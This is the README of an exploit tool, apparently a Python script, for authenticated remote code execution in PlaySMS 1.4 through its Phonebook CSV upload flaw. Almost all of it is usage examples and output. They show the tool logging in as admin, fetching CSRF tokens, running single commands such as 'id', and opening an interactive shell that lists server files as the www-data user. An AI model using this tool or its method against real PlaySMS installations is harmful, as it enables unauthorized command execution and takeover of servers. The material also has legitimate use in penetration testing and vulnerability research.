# PlaySMS 1.4 authenticated RCE

Simple method of performing remote code execution through the Phonebook CSV upload issue as described on [ExploitDB](https://www.exploit-db.com/exploits/42044/).

Either run a single command:

```
% python3 playsmshell.py --url http://localhost/playsms --password playwithsms -c 'id'
[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
uid=33(www-data) gid=33(www-data) groups=33(www-data)

%
```

Or mimic a shell of sorts:

```
% python3 playsmshell.py --url http://localhost/playsms --password playwithsms -i
[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
[+] Entering interactive shell; type "quit" or ^D to quit
> uname -a
Linux localhost 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 i686 i686 GNU/Linux

> ls
config-dist.php
config.php
inc
index.php
init.php
lib
plugin
storage

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

>
```
